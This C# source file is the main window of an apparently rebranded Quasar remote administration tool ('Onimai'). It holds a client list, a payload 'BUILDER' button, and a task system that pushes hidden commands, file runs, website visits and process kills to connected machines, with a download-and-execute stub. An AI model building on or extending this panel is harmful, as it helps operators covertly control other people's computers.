		this.imgFlags.Images.SetKeyName(128, "lk.png");
		this.imgFlags.Images.SetKeyName(129, "lr.png");
		this.imgFlags.Images.SetKeyName(130, "ls.png");
		this.imgFlags.Images.SetKeyName(131, "lt.png");
		this.imgFlags.Images.SetKeyName(132, "lu.png");
		this.imgFlags.Images.SetKeyName(133, "lv.png");
		this.imgFlags.Images.SetKeyName(134, "ly.png");
		this.imgFlags.Images.SetKeyName(135, "ma.png");
		this.imgFlags.Images.SetKeyName(136, "mc.png");
		this.imgFlags.Images.SetKeyName(137, "md.png");
		this.imgFlags.Images.SetKeyName(138, "me.png");
		this.imgFlags.Images.SetKeyName(139, "mg.png");
		this.imgFlags.Images.SetKeyName(140, "mh.png");
		this.imgFlags.Images.SetKeyName(141, "mk.png");
		this.imgFlags.Images.SetKeyName(142, "ml.png");
		this.imgFlags.Images.SetKeyName(143, "mm.png");
		this.imgFlags.Images.SetKeyName(144, "mn.png");
		this.imgFlags.Images.SetKeyName(145, "mo.png");
		this.imgFlags.Images.SetKeyName(146, "mp.png");
		this.imgFlags.Images.SetKeyName(147, "mq.png");
		this.imgFlags.Images.SetKeyName(148, "mr.png");
		this.imgFlags.Images.SetKeyName(149, "ms.png");
		this.imgFlags.Images.SetKeyName(150, "mt.png");
		this.imgFlags.Images.SetKeyName(151, "mu.png");
		this.imgFlags.Images.SetKeyName(152, "mv.png");
		this.imgFlags.Images.SetKeyName(153, "mw.png");
		this.imgFlags.Images.SetKeyName(154, "mx.png");
		this.imgFlags.Images.SetKeyName(155, "my.png");
		this.imgFlags.Images.SetKeyName(156, "mz.png");
		this.imgFlags.Images.SetKeyName(157, "na.png");
		this.imgFlags.Images.SetKeyName(158, "nc.png");
		this.imgFlags.Images.SetKeyName(159, "ne.png");
		this.imgFlags.Images.SetKeyName(160, "nf.png");
		this.imgFlags.Images.SetKeyName(161, "ng.png");
		this.imgFlags.Images.SetKeyName(162, "ni.png");
		this.imgFlags.Images.SetKeyName(163, "nl.png");
		this.imgFlags.Images.SetKeyName(164, "no.png");
		this.imgFlags.Images.SetKeyName(165, "np.png");
		this.imgFlags.Images.SetKeyName(166, "nr.png");
		this.imgFlags.Images.SetKeyName(167, "nu.png");
		this.imgFlags.Images.SetKeyName(168, "nz.png");
		this.imgFlags.Images.SetKeyName(169, "om.png");
		this.imgFlags.Images.SetKeyName(170, "pa.png");
		this.imgFlags.Images.SetKeyName(171, "pe.png");
		this.imgFlags.Images.SetKeyName(172, "pf.png");
		this.imgFlags.Images.SetKeyName(173, "pg.png");
		this.imgFlags.Images.SetKeyName(174, "ph.png");
		this.imgFlags.Images.SetKeyName(175, "pk.png");
		this.imgFlags.Images.SetKeyName(176, "pl.png");
		this.imgFlags.Images.SetKeyName(177, "pm.png");
		this.imgFlags.Images.SetKeyName(178, "pn.png");
		this.imgFlags.Images.SetKeyName(179, "pr.png");
		this.imgFlags.Images.SetKeyName(180, "ps.png");
		this.imgFlags.Images.SetKeyName(181, "pt.png");
		this.imgFlags.Images.SetKeyName(182, "pw.png");
		this.imgFlags.Images.SetKeyName(183, "py.png");
		this.imgFlags.Images.SetKeyName(184, "qa.png");
		this.imgFlags.Images.SetKeyName(185, "re.png");
		this.imgFlags.Images.SetKeyName(186, "ro.png");
		this.imgFlags.Images.SetKeyName(187, "rs.png");
		this.imgFlags.Images.SetKeyName(188, "ru.png");
		this.imgFlags.Images.SetKeyName(189, "rw.png");
		this.imgFlags.Images.SetKeyName(190, "sa.png");
		this.imgFlags.Images.SetKeyName(191, "sb.png");
		this.imgFlags.Images.SetKeyName(192, "sc.png");
		this.imgFlags.Images.SetKeyName(193, "scotland.png");
		this.imgFlags.Images.SetKeyName(194, "sd.png");
		this.imgFlags.Images.SetKeyName(195, "se.png");
		this.imgFlags.Images.SetKeyName(196, "sg.png");
		this.imgFlags.Images.SetKeyName(197, "sh.png");
		this.imgFlags.Images.SetKeyName(198, "si.png");
		this.imgFlags.Images.SetKeyName(199, "sj.png");
		this.imgFlags.Images.SetKeyName(200, "sk.png");
		this.imgFlags.Images.SetKeyName(201, "sl.png");
		this.imgFlags.Images.SetKeyName(202, "sm.png");
		this.imgFlags.Images.SetKeyName(203, "sn.png");
		this.imgFlags.Images.SetKeyName(204, "so.png");
		this.imgFlags.Images.SetKeyName(205, "sr.png");
		this.imgFlags.Images.SetKeyName(206, "st.png");
		this.imgFlags.Images.SetKeyName(207, "sv.png");
		this.imgFlags.Images.SetKeyName(208, "sy.png");
		this.imgFlags.Images.SetKeyName(209, "sz.png");
		this.imgFlags.Images.SetKeyName(210, "tc.png");
		this.imgFlags.Images.SetKeyName(211, "td.png");
		this.imgFlags.Images.SetKeyName(212, "tf.png");
		this.imgFlags.Images.SetKeyName(213, "tg.png");
		this.imgFlags.Images.SetKeyName(214, "th.png");
		this.imgFlags.Images.SetKeyName(215, "tj.png");
		this.imgFlags.Images.SetKeyName(216, "tk.png");
		this.imgFlags.Images.SetKeyName(217, "tl.png");
		this.imgFlags.Images.SetKeyName(218, "tm.png");
		this.imgFlags.Images.SetKeyName(219, "tn.png");
		this.imgFlags.Images.SetKeyName(220, "to.png");
		this.imgFlags.Images.SetKeyName(221, "tr.png");
		this.imgFlags.Images.SetKeyName(222, "tt.png");
		this.imgFlags.Images.SetKeyName(223, "tv.png");
		this.imgFlags.Images.SetKeyName(224, "tw.png");
		this.imgFlags.Images.SetKeyName(225, "tz.png");
		this.imgFlags.Images.SetKeyName(226, "ua.png");
		this.imgFlags.Images.SetKeyName(227, "ug.png");
		this.imgFlags.Images.SetKeyName(228, "um.png");
		this.imgFlags.Images.SetKeyName(229, "us.png");
		this.imgFlags.Images.SetKeyName(230, "uy.png");
		this.imgFlags.Images.SetKeyName(231, "uz.png");
		this.imgFlags.Images.SetKeyName(232, "va.png");
		this.imgFlags.Images.SetKeyName(233, "vc.png");
		this.imgFlags.Images.SetKeyName(234, "ve.png");
		this.imgFlags.Images.SetKeyName(235, "vg.png");
		this.imgFlags.Images.SetKeyName(236, "vi.png");
		this.imgFlags.Images.SetKeyName(237, "vn.png");
		this.imgFlags.Images.SetKeyName(238, "vu.png");
		this.imgFlags.Images.SetKeyName(239, "wales.png");
		this.imgFlags.Images.SetKeyName(240, "wf.png");
		this.imgFlags.Images.SetKeyName(241, "ws.png");
		this.imgFlags.Images.SetKeyName(242, "ye.png");
		this.imgFlags.Images.SetKeyName(243, "yt.png");
		this.imgFlags.Images.SetKeyName(244, "za.png");
		this.imgFlags.Images.SetKeyName(245, "zm.png");
		this.imgFlags.Images.SetKeyName(246, "zw.png");
		this.imgFlags.Images.SetKeyName(247, "xy.png");
		this.notifyIcon.Icon = (System.Drawing.Icon)resources.GetObject("notifyIcon.Icon");
		this.notifyIcon.Text = "Quasar";
		this.notifyIcon.Visible = true;
		this.notifyIcon.MouseDoubleClick += new System.Windows.Forms.MouseEventHandler(notifyIcon_MouseDoubleClick);
		this.label1.AutoSize = true;
		this.label1.Location = new System.Drawing.Point(1554, 9);
		this.label1.Name = "label1";
		this.label1.Size = new System.Drawing.Size(79, 13);
		this.label1.TabIndex = 8;
		this.label1.Text = "Client Preview";
		this.gBoxClientInfo.Controls.Add(this.listView1);
		this.gBoxClientInfo.Location = new System.Drawing.Point(1557, 265);
		this.gBoxClientInfo.Name = "gBoxClientInfo";
		this.gBoxClientInfo.Size = new System.Drawing.Size(339, 185);
		this.gBoxClientInfo.TabIndex = 9;
		this.gBoxClientInfo.TabStop = false;
		this.gBoxClientInfo.Text = "Client Info";
		this.listView1.Columns.AddRange(new System.Windows.Forms.ColumnHeader[2] { this.Names, this.Stats });
		this.listView1.FullRowSelect = true;
		this.listView1.HideSelection = false;
		this.listView1.Items.AddRange(new System.Windows.Forms.ListViewItem[5] { listViewItem, listViewItem2, listViewItem3, listViewItem4, listViewItem5 });
		this.listView1.Location = new System.Drawing.Point(0, 21);
		listViewColumnSorter.NeedNumberCompare = false;
		listViewColumnSorter.Order = System.Windows.Forms.SortOrder.None;
		listViewColumnSorter.SortColumn = 0;
		this.listView1.LvwColumnSorter = listViewColumnSorter;
		this.listView1.Name = "listView1";
		this.listView1.Size = new System.Drawing.Size(339, 188);
		this.listView1.TabIndex = 0;
		this.listView1.UseCompatibleStateImageBehavior = false;
		this.listView1.View = System.Windows.Forms.View.Details;
		this.Names.Text = "Names";
		this.Names.Width = 122;
		this.Stats.Text = "Stats";
		this.Stats.Width = 213;
		this.pictureBoxMain.Image = Quasar.Server.Properties.Resources.no_previewbmp;
		this.pictureBoxMain.InitialImage = null;
		this.pictureBoxMain.Location = new System.Drawing.Point(1557, 28);
		this.pictureBoxMain.Name = "pictureBoxMain";
		this.pictureBoxMain.Size = new System.Drawing.Size(339, 207);
		this.pictureBoxMain.TabIndex = 31;
		this.pictureBoxMain.TabStop = false;
		this.guna2Button1.DisabledState.BorderColor = System.Drawing.Color.DarkGray;
		this.guna2Button1.DisabledState.CustomBorderColor = System.Drawing.Color.DarkGray;
		this.guna2Button1.DisabledState.FillColor = System.Drawing.Color.FromArgb(169, 169, 169);
		this.guna2Button1.DisabledState.ForeColor = System.Drawing.Color.FromArgb(141, 141, 141);
		this.guna2Button1.FillColor = System.Drawing.Color.FromArgb(60, 60, 60);
		this.guna2Button1.Font = new System.Drawing.Font("Segoe UI", 9.75f, System.Drawing.FontStyle.Bold, System.Drawing.GraphicsUnit.Point, 0);
		this.guna2Button1.ForeColor = System.Drawing.Color.White;
		this.guna2Button1.Location = new System.Drawing.Point(8, 195);
		this.guna2Button1.Name = "guna2Button1";
		this.guna2Button1.Size = new System.Drawing.Size(227, 45);
		this.guna2Button1.TabIndex = 33;
		this.guna2Button1.Text = "BUILDER";
		this.guna2Button1.Click += new System.EventHandler(guna2Button1_Click);
		this.guna2CirclePictureBox1.Image = (System.Drawing.Image)resources.GetObject("guna2CirclePictureBox1.Image");
		this.guna2CirclePictureBox1.ImageRotate = 0f;
		this.guna2CirclePictureBox1.Location = new System.Drawing.Point(56, 12);
		this.guna2CirclePictureBox1.Name = "guna2CirclePictureBox1";
		this.guna2CirclePictureBox1.ShadowDecoration.Mode = Guna.UI2.WinForms.Enums.ShadowMode.Circle;
		this.guna2CirclePictureBox1.Size = new System.Drawing.Size(118, 115);
		this.guna2CirclePictureBox1.SizeMode = System.Windows.Forms.PictureBoxSizeMode.Zoom;
		this.guna2CirclePictureBox1.TabIndex = 34;
		this.guna2CirclePictureBox1.TabStop = false;
		this.label2.AutoSize = true;
		this.label2.Font = new System.Drawing.Font("Segoe UI Semibold", 11.25f, System.Drawing.FontStyle.Bold, System.Drawing.GraphicsUnit.Point, 0);
		this.label2.ForeColor = System.Drawing.SystemColors.Control;
		this.label2.Location = new System.Drawing.Point(25, 134);
		this.label2.Name = "label2";
		this.label2.Size = new System.Drawing.Size(195, 20);
		this.label2.TabIndex = 35;
		this.label2.Text = "             MrThunker";
		this.listenToolStripStatusLabel.AutoSize = true;
		this.listenToolStripStatusLabel.ForeColor = System.Drawing.SystemColors.Control;
		this.listenToolStripStatusLabel.Location = new System.Drawing.Point(79, 161);
		this.listenToolStripStatusLabel.Name = "listenToolStripStatusLabel";
		this.listenToolStripStatusLabel.Size = new System.Drawing.Size(77, 13);
		this.listenToolStripStatusLabel.TabIndex = 36;
		this.listenToolStripStatusLabel.Text = "Not listening.";
		this.guna2Button2.DisabledState.BorderColor = System.Drawing.Color.DarkGray;
		this.guna2Button2.DisabledState.CustomBorderColor = System.Drawing.Color.DarkGray;
		this.guna2Button2.DisabledState.FillColor = System.Drawing.Color.FromArgb(169, 169, 169);
		this.guna2Button2.DisabledState.ForeColor = System.Drawing.Color.FromArgb(141, 141, 141);
		this.guna2Button2.FillColor = System.Drawing.Color.FromArgb(60, 60, 60);
		this.guna2Button2.Font = new System.Drawing.Font("Segoe UI", 9.75f, System.Drawing.FontStyle.Bold, System.Drawing.GraphicsUnit.Point, 0);
		this.guna2Button2.ForeColor = System.Drawing.Color.White;
		this.guna2Button2.Location = new System.Drawing.Point(8, 246);
		this.guna2Button2.Name = "guna2Button2";
		this.guna2Button2.Size = new System.Drawing.Size(227, 45);
		this.guna2Button2.TabIndex = 37;
		this.guna2Button2.Text = "UPDATE";
		this.guna2Button2.Click += new System.EventHandler(guna2Button2_Click);
		this.guna2Button3.DisabledState.BorderColor = System.Drawing.Color.DarkGray;
		this.guna2Button3.DisabledState.CustomBorderColor = System.Drawing.Color.DarkGray;
		this.guna2Button3.DisabledState.FillColor = System.Drawing.Color.FromArgb(169, 169, 169);
		this.guna2Button3.DisabledState.ForeColor = System.Drawing.Color.FromArgb(141, 141, 141);
		this.guna2Button3.FillColor = System.Drawing.Color.FromArgb(60, 60, 60);
		this.guna2Button3.Font = new System.Drawing.Font("Segoe UI", 9.75f, System.Drawing.FontStyle.Bold, System.Drawing.GraphicsUnit.Point, 0);
		this.guna2Button3.ForeColor = System.Drawing.Color.White;
		this.guna2Button3.Location = new System.Drawing.Point(8, 297);
		this.guna2Button3.Name = "guna2Button3";
		this.guna2Button3.Size = new System.Drawing.Size(227, 45);
		this.guna2Button3.TabIndex = 38;
		this.guna2Button3.Text = "ABOUT";
		this.guna2Button3.Click += new System.EventHandler(guna2Button3_Click);
		this.guna2Button4.DisabledState.BorderColor = System.Drawing.Color.DarkGray;
		this.guna2Button4.DisabledState.CustomBorderColor = System.Drawing.Color.DarkGray;
		this.guna2Button4.DisabledState.FillColor = System.Drawing.Color.FromArgb(169, 169, 169);
		this.guna2Button4.DisabledState.ForeColor = System.Drawing.Color.FromArgb(141, 141, 141);
		this.guna2Button4.FillColor = System.Drawing.Color.FromArgb(60, 60, 60);
		this.guna2Button4.Font = new System.Drawing.Font("Segoe UI", 9.75f, System.Drawing.FontStyle.Bold, System.Drawing.GraphicsUnit.Point, 0);
		this.guna2Button4.ForeColor = System.Drawing.Color.White;
		this.guna2Button4.Location = new System.Drawing.Point(8, 348);
		this.guna2Button4.Name = "guna2Button4";
		this.guna2Button4.Size = new System.Drawing.Size(227, 45);
		this.guna2Button4.TabIndex = 39;
		this.guna2Button4.Text = "SIGN OUT";
		this.guna2Button4.Click += new System.EventHandler(guna2Button4_Click);
		this.guna2Button5.DisabledState.BorderColor = System.Drawing.Color.DarkGray;
		this.guna2Button5.DisabledState.CustomBorderColor = System.Drawing.Color.DarkGray;
		this.guna2Button5.DisabledState.FillColor = System.Drawing.Color.FromArgb(169, 169, 169);
		this.guna2Button5.DisabledState.ForeColor = System.Drawing.Color.FromArgb(141, 141, 141);
		this.guna2Button5.FillColor = System.Drawing.Color.FromArgb(60, 60, 60);
		this.guna2Button5.Font = new System.Drawing.Font("Segoe UI", 9.75f, System.Drawing.FontStyle.Bold, System.Drawing.GraphicsUnit.Point, 0);
		this.guna2Button5.ForeColor = System.Drawing.Color.White;
		this.guna2Button5.Location = new System.Drawing.Point(8, 443);
		this.guna2Button5.Name = "guna2Button5";
		this.guna2Button5.Size = new System.Drawing.Size(227, 45);
		this.guna2Button5.TabIndex = 40;
		this.guna2Button5.Text = "SETTINGS";
		this.guna2Button5.Click += new System.EventHandler(guna2Button5_Click);
		this.lstClients.BorderStyle = System.Windows.Forms.BorderStyle.FixedSingle;
		this.lstClients.Columns.AddRange(new System.Windows.Forms.ColumnHeader[9] { this.hIP, this.hTag, this.hUserPC, this.hVersion, this.hStatus, this.hUserStatus, this.hCountry, this.hOS, this.hAccountType });
		this.lstClients.ContextMenuStrip = this.contextMenuStrip;
		this.lstClients.Font = new System.Drawing.Font("Segoe UI", 9f, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, 0);
		this.lstClients.FullRowSelect = true;
		this.lstClients.HideSelection = false;
		this.lstClients.Location = new System.Drawing.Point(243, 0);
		listViewColumnSorter2.NeedNumberCompare = false;
		listViewColumnSorter2.Order = System.Windows.Forms.SortOrder.None;
		listViewColumnSorter2.SortColumn = 0;
		this.lstClients.LvwColumnSorter = listViewColumnSorter2;
		this.lstClients.Name = "lstClients";
		this.lstClients.ShowItemToolTips = true;
		this.lstClients.Size = new System.Drawing.Size(973, 496);
		this.lstClients.SmallImageList = this.imgFlags;
		this.lstClients.TabIndex = 32;
		this.lstClients.UseCompatibleStateImageBehavior = false;
		this.lstClients.View = System.Windows.Forms.View.Details;
		this.hIP.Text = "IP Address";
		this.hIP.Width = 148;
		this.hTag.Text = "Tag";
		this.hUserPC.Text = "User@PC";
		this.hUserPC.Width = 122;
		this.hVersion.Text = "Version";
		this.hVersion.Width = 55;
		this.hStatus.Text = "Status";
		this.hStatus.Width = 61;
		this.hUserStatus.Text = "User Status";
		this.hUserStatus.Width = 72;
		this.hCountry.Text = "Country";
		this.hCountry.Width = 62;
		this.hOS.Text = "Operating System";
		this.hOS.Width = 127;
		this.hAccountType.Text = "Account Type";
		this.hAccountType.Width = 264;
		base.AutoScaleDimensions = new System.Drawing.SizeF(96f, 96f);
		base.AutoScaleMode = System.Windows.Forms.AutoScaleMode.Dpi;
		this.BackColor = System.Drawing.Color.FromArgb(25, 25, 25);
		base.ClientSize = new System.Drawing.Size(1216, 496);
		base.Controls.Add(this.guna2Button5);
		base.Controls.Add(this.guna2Button4);
		base.Controls.Add(this.guna2Button3);
		base.Controls.Add(this.guna2Button2);
		base.Controls.Add(this.listenToolStripStatusLabel);
		base.Controls.Add(this.label2);
		base.Controls.Add(this.guna2CirclePictureBox1);
		base.Controls.Add(this.guna2Button1);
		base.Controls.Add(this.lstClients);
		base.Controls.Add(this.pictureBoxMain);
		base.Controls.Add(this.gBoxClientInfo);
		base.Controls.Add(this.label1);
		this.Font = new System.Drawing.Font("Segoe UI", 8.25f, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, 0);
		this.ForeColor = System.Drawing.Color.Black;
		base.FormBorderStyle = System.Windows.Forms.FormBorderStyle.FixedSingle;
		base.Icon = (System.Drawing.Icon)resources.GetObject("$this.Icon");
		base.MaximizeBox = false;
		this.MinimumSize = new System.Drawing.Size(680, 415);
		base.Name = "FrmMain";
		base.StartPosition = System.Windows.Forms.FormStartPosition.CenterScreen;
		this.Text = "Onimai | v1.5.2 | Connected: 0";
		base.FormClosing += new System.Windows.Forms.FormClosingEventHandler(FrmMain_FormClosing);
		base.Load += new System.EventHandler(FrmMain_Load);
		this.contextMenuStrip.ResumeLayout(false);
		this.gBoxClientInfo.ResumeLayout(false);
		((System.ComponentModel.ISupportInitialize)this.pictureBoxMain).EndInit();
		((System.ComponentModel.ISupportInitialize)this.guna2CirclePictureBox1).EndInit();
		base.ResumeLayout(false);
		base.PerformLayout();
	}
	public void ReloadProfilePicture()
	{
		LoadProfilePicture();
	}

	private void LoadProfilePicture()
	{
		try
		{
			if (Quasar.Server.Models.Settings.UseCustomProfilePicture &&
				!string.IsNullOrEmpty(Quasar.Server.Models.Settings.CustomProfilePicturePath))
			{
				if (File.Exists(Quasar.Server.Models.Settings.CustomProfilePicturePath))
				{
					// Dispose old image if exists
					if (guna2CirclePictureBox1.Image != null)
					{
						var oldImage = guna2CirclePictureBox1.Image;
						guna2CirclePictureBox1.Image = null;
						oldImage.Dispose();
					}

					// Load new image
					guna2CirclePictureBox1.Image = Image.FromFile(Quasar.Server.Models.Settings.CustomProfilePicturePath);
				}
				else
				{
					// If saved path doesn't exist, reset to default
					LoadDefaultProfilePicture();
				}
			}
			else
			{
				LoadDefaultProfilePicture();
			}
		}
		catch
		{
			LoadDefaultProfilePicture();
		}
	}

	private void LoadDefaultProfilePicture()
	{
		// Keep the current default image that's already set in the designer
		// This preserves whatever default image you have
		try
		{
			// If you want to explicitly set a default from resources:
			// guna2CirclePictureBox1.Image = Resources.YourDefaultProfileImage;

			// Otherwise, the designer's image is kept as default (do nothing)
		}
		catch
		{
			// Ignore errors, keep current image
		}
	}

	// OPTIONAL: Keep this if you still want to allow clicking to change picture
	private void guna2CirclePictureBox1_Click(object sender, EventArgs e)
	{
		// Check if custom profile picture is enabled
		if (!Quasar.Server.Models.Settings.UseCustomProfilePicture)
		{
			MessageBox.Show("Please enable 'Custom User Profile Picture' in Settings first.",
				"Feature Disabled",
				MessageBoxButtons.OK,
				MessageBoxIcon.Information);
			return;
		}

		// Open file dialog to select a custom profile picture
		using (OpenFileDialog openFileDialog = new OpenFileDialog())
		{
			openFileDialog.Filter = "Image Files|*.jpg;*.jpeg;*.png;*.bmp;*.gif|All Files|*.*";
			openFileDialog.Title = "Select Profile Picture";
			openFileDialog.Multiselect = false;

			if (openFileDialog.ShowDialog() == DialogResult.OK)
			{
				try
				{
					// Dispose old image
					if (guna2CirclePictureBox1.Image != null)
					{
						var oldImage = guna2CirclePictureBox1.Image;
						guna2CirclePictureBox1.Image = null;
						oldImage.Dispose();
					}

					// Load and set the new profile picture
					guna2CirclePictureBox1.Image = Image.FromFile(openFileDialog.FileName);

					// Save the image path to settings
					Quasar.Server.Models.Settings.CustomProfilePicturePath = openFileDialog.FileName;

					MessageBox.Show("Profile picture updated successfully!",
						"Success",
						MessageBoxButtons.OK,
						MessageBoxIcon.Information);
				}
				catch (Exception ex)
				{
					MessageBox.Show($"Failed to load image: {ex.Message}",
						"Error",
						MessageBoxButtons.OK,
						MessageBoxIcon.Error);
				}
			}
		}
	}



	public void ApplyAutoResizeUI(bool enable)
	{
		try
		{
			if (enable)
			{
				this.FormBorderStyle = FormBorderStyle.Sizable;
				this.MaximizeBox = true;
				this.AutoScaleMode = AutoScaleMode.Dpi;
				this.MinimumSize = new Size(680, 415);
				this.MaximumSize = new Size(0, 0);
				SetupControlsForResizing();
			}
			else
			{
				this.FormBorderStyle = FormBorderStyle.FixedSingle;
				this.MaximizeBox = false;
				this.AutoScaleMode = AutoScaleMode.None;
				this.Size = new Size(1232, 535);
				this.MinimumSize = new Size(680, 415);
			}


			this.PerformLayout();
			this.Refresh();
		}
		catch (Exception ex)
		{
			Console.WriteLine($"Error applying auto resize UI: {ex.Message}");
		}
	}


	private void SetupControlsForResizing()
	{
		try
		{

			if (lstClients != null)
			{
				lstClients.Anchor = AnchorStyles.Top | AnchorStyles.Bottom | AnchorStyles.Left | AnchorStyles.Right;
			}


			if (guna2CirclePictureBox1 != null)
			{
				guna2CirclePictureBox1.Anchor = AnchorStyles.Top | AnchorStyles.Left;
			}

			if (label2 != null)
			{
				label2.Anchor = AnchorStyles.Top | AnchorStyles.Left;
			}

			if (listenToolStripStatusLabel != null)
			{
				listenToolStripStatusLabel.Anchor = AnchorStyles.Top | AnchorStyles.Left;
			}


			if (guna2Button1 != null)
			{
				guna2Button1.Anchor = AnchorStyles.Top | AnchorStyles.Left;
			}

			if (guna2Button2 != null)
			{
				guna2Button2.Anchor = AnchorStyles.Top | AnchorStyles.Left;
			}

			if (guna2Button3 != null)
			{
				guna2Button3.Anchor = AnchorStyles.Top | AnchorStyles.Left;
			}

			if (guna2Button4 != null)
			{
				guna2Button4.Anchor = AnchorStyles.Top | AnchorStyles.Left;
			}

			if (guna2Button5 != null)
			{
				guna2Button5.Anchor = AnchorStyles.Bottom | AnchorStyles.Left;
			}


			if (label1 != null)
			{
				label1.Anchor = AnchorStyles.Top | AnchorStyles.Right;
			}

			if (pictureBoxMain != null)
			{
				pictureBoxMain.Anchor = AnchorStyles.Top | AnchorStyles.Right;
			}

			if (gBoxClientInfo != null)
			{
				gBoxClientInfo.Anchor = AnchorStyles.Top | AnchorStyles.Right;
			}

			if (listView1 != null)
			{
				listView1.Anchor = AnchorStyles.Top | AnchorStyles.Bottom | AnchorStyles.Left | AnchorStyles.Right;
			}
		}
		catch (Exception ex)
		{
			Console.WriteLine($"Error setting up controls for resizing: {ex.Message}");
		}
	}

    private void btnAddTask_Click(object sender, EventArgs e)
    {
        using (FrmTaskEditor editor = new FrmTaskEditor())
        {
            if (editor.ShowDialog() == DialogResult.OK)
            {
                TaskManager.AddTask(editor.Task);
                RefreshTasksList();
            }
        }
    }

    private void btnEditTask_Click(object sender, EventArgs e)
    {
        if (lstTasks.SelectedItems.Count == 0)
        {
            MessageBox.Show("Please select a task to edit.", "No Selection", MessageBoxButtons.OK, MessageBoxIcon.Information);
            return;
        }

        Guid taskId = (Guid)lstTasks.SelectedItems[0].Tag;
        var task = TaskManager.GetTaskById(taskId);

        if (task != null)
        {
            using (FrmTaskEditor editor = new FrmTaskEditor(task))
            {
                if (editor.ShowDialog() == DialogResult.OK)
                {
                    TaskManager.UpdateTask(editor.Task);
                    RefreshTasksList();
                }
            }
        }
    }

    private void btnDeleteTask_Click(object sender, EventArgs e)
    {
        if (lstTasks.SelectedItems.Count == 0)
        {
            MessageBox.Show("Please select a task to delete.", "No Selection", MessageBoxButtons.OK, MessageBoxIcon.Information);
            return;
        }

        if (MessageBox.Show("Are you sure you want to delete this task?", "Confirm Delete",
            MessageBoxButtons.YesNo, MessageBoxIcon.Question) == DialogResult.Yes)
        {
            Guid taskId = (Guid)lstTasks.SelectedItems[0].Tag;
            TaskManager.DeleteTask(taskId);
            RefreshTasksList();
        }
    }

    private void btnToggleTask_Click(object sender, EventArgs e)
    {
        if (lstTasks.SelectedItems.Count == 0)
        {
            MessageBox.Show("Please select a task to enable/disable.", "No Selection", MessageBoxButtons.OK, MessageBoxIcon.Information);
            return;
        }

        Guid taskId = (Guid)lstTasks.SelectedItems[0].Tag;
        TaskManager.ToggleTaskEnabled(taskId);
        RefreshTasksList();
    }

    // ===== REFRESH TASKS LIST =====

    private void RefreshTasksList()
    {
        try
        {
            lstTasks.Items.Clear();

            var tasks = TaskManager.GetAllTasks();
            foreach (var task in tasks)
            {
                ListViewItem item = new ListViewItem(task.Enabled ? "✓" : "");
                item.SubItems.Add(task.TaskName);
                item.SubItems.Add(task.ActionType.ToString());
                item.SubItems.Add(task.ActionDetails.Length > 50
                    ? task.ActionDetails.Substring(0, 47) + "..."
                    : task.ActionDetails);
                item.SubItems.Add(task.Condition.ToString());
                item.SubItems.Add(task.ConditionValue);
                item.Tag = task.Id;

                if (!task.Enabled)
                {
                    item.ForeColor = System.Drawing.Color.Gray;
                }

                lstTasks.Items.Add(item);
            }
        }
        catch (Exception ex)
        {
            Console.WriteLine($"Error refreshing tasks list: {ex.Message}");
        }
    }

    // ===== TASK EXECUTION =====

    private void ExecuteTasksForClient(Client client)
    {
        try
        {
            var tasks = TaskManager.GetTasksForClient(client);

            foreach (var task in tasks)
            {
                ExecuteTask(client, task);
            }

            if (tasks.Count > 0)
            {
                Console.WriteLine($"Executed {tasks.Count} task(s) for client {client.Value.UserAtPc}");
            }
        }
        catch (Exception ex)
        {
            Console.WriteLine($"Error executing tasks for client: {ex.Message}");
        }
    }

    private void ExecuteTask(Client client, ClientTask task)
    {
        try
        {
            Console.WriteLine($"Executing task '{task.TaskName}' for client {client.Value.UserAtPc}");

            switch (task.ActionType)
            {
                case TaskActionType.ExecuteCommand:
                    // Execute command (hidden)
                    client.Send(new Quasar.Common.Messages.QuickCommands.DoSendQuickCommand
                    {
                        Command = task.ActionDetails
                    });
                    break;

                case TaskActionType.RunFile:
                    // Run file
                    client.Send(new Quasar.Common.Messages.QuickCommands.DoSendQuickCommand
                    {
                        Command = task.ActionDetails
                    });
                    break;

                case TaskActionType.ShowMessageBox:
                    // Show message box
                    var parts = task.ActionDetails.Split('|');
                    client.Send(new Quasar.Common.Messages.UserSupport.MessageBox.DoShowMessageBox
                    {
                        Caption = parts.Length > 0 ? parts[0] : "Message",
                        Text = parts.Length > 1 ? parts[1] : "",
                        Button = "OK",
                        Icon = "Information"
                    });
                    break;

                case TaskActionType.VisitWebsite:
                    // Visit website
                    client.Send(new Quasar.Common.Messages.UserSupport.Website.DoVisitWebsite
                    {
                        Url = task.ActionDetails,
                        Hidden = false
                    });
                    break;

                case TaskActionType.DownloadAndExecute:
                    // Download and execute
                    Console.WriteLine("DownloadAndExecute not yet implemented");
                    break;

                case TaskActionType.KillProcess:
                    // Kill process
                    client.Send(new Quasar.Common.Messages.QuickCommands.DoSendQuickCommand
                    {
                        Command = $"taskkill /F /IM {task.ActionDetails}"
                    });
                    break;

                default:
                    Console.WriteLine($"Unknown task action type: {task.ActionType}");
                    break;
            }
        }
        catch (Exception ex)
        {
            Console.WriteLine($"Error executing task '{task.TaskName}': {ex.Message}");
        }
    }

    private void FrmMain_Resize(object sender, EventArgs e)
	{
		if (Quasar.Server.Models.Settings.AutoResizeUI)
		{
			AdjustFormLayout();
		}
	}

	private void AdjustFormLayout()
	{
		try
		{
			if (lstClients != null && lstClients.Columns.Count > 0 && lstClients.Width > 0)
			{
				int totalWidth = lstClients.ClientSize.Width;
				int[] columnPercentages = { 15, 8, 12, 6, 6, 8, 8, 13, 24 };

				for (int i = 0; i < lstClients.Columns.Count && i < columnPercentages.Length; i++)
				{
					lstClients.Columns[i].Width = (totalWidth * columnPercentages[i]) / 100;
				}
			}
		}
		catch (Exception ex)
		{
			Console.WriteLine($"Error adjusting form layout: {ex.Message}");
		}
	}
}